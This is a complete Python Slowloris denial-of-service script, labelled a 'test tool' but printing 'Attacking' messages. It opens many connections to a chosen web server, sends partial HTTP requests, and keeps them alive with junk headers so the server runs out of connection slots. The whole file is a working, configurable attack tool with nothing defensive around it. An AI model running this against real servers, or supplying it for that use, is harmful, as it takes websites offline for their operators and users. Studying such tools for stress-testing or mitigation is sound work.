import socket
import random
import time
import argparse

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",
]

def create_socket(target_host, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_host, target_port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target_host}\r\n".encode("utf-8"))
        s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error as e:
        return None

def main():
    parser = argparse.ArgumentParser(description="Slowloris Test Tool.")
    parser.add_argument("host", help="Target website IP or domain.")
    parser.add_argument("-p", "--port", type=int, default=80, help="Web server port (default: 80).")
    parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets to open (default: 150).")
    parser.add_argument("-i", "--interval", type=int, default=15, help="Interval (seconds) to send keep-alive headers (default: 15).")
    
    args = parser.parse_args()

    target_host = args.host
    target_port = args.port
    socket_count = args.sockets
    interval = args.interval
    
    list_of_sockets = []

    print(f"[*] Attacking {target_host} on port {target_port}")
    print(f"[*] Opening {socket_count} connections.")

    for _ in range(socket_count):
        s = create_socket(target_host, target_port)
        if s:
            list_of_sockets.append(s)

    print(f"[*] Successfully opened {len(list_of_sockets)} connections.")
    
    while True:
        print(f"[*] Keeping {len(list_of_sockets)} connections alive...")
        try:
            for s in list(list_of_sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)

            diff = socket_count - len(list_of_sockets)
            if diff > 0:
                print(f"[*] {diff} connections were closed. Re-opening...")
                for _ in range(diff):
                    s = create_socket(target_host, target_port)
                    if s:
                        list_of_sockets.append(s)

            time.sleep(interval)

        except (KeyboardInterrupt, SystemExit):
            print("\n[!] Attack stopped.")
            break

if __name__ == "__main__":
    main()